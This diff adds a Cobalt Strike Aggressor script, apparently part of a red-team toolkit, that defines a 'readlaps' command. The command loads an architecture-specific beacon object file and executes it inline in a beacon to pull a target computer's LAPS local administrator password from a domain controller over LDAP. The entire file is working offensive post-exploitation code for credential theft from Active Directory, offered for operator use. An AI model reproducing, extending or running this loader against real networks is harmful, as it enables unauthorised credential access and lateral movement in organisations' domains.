@@ -1,0 +1,37 @@
+alias readlaps {
+    local('$bid $barch $handle $data $args');
+    local('$dc $rootDN $computerName');
+
+    $bid = $1;
+
+    if (size(@_) < 4) {
+        berror($bid, "Usage: readlaps <dc> <rootDN> <computerName>");
+        berror($bid, "  dc           - DC hostname or IP, e.g. dc01.corp.local");
+        berror($bid, "  rootDN       - LDAP base DN, e.g. DC=corp,DC=local");
+        berror($bid, "  computerName - sAMAccountName of the target computer (with or without \$)");
+        return;
+    }
+
+    $dc          = $2;
+    $rootDN      = $3;
+    $computerName = $4;
+
+    $barch = barch($bid);
+    if ($barch eq "x64") {
+        $handle = openf(script_resource("readlaps.x64.o"));
+    } else {
+        $handle = openf(script_resource("readlaps.x86.o"));
+    }
+    $data = readb($handle, -1);
+    closef($handle);
+
+    if (strlen($data) == 0) {
+        berror($bid, "[-] Could not read BOF object file. Did you run `make`?");
+        return;
+    }
+
+    $args = bof_pack($bid, "zzz", $dc, $rootDN, $computerName);
+
+    btask($bid, "Executing readlaps BOF: querying LAPS password for " . $computerName);
+    beacon_inline_execute($bid, $data, "go", $args);
+}
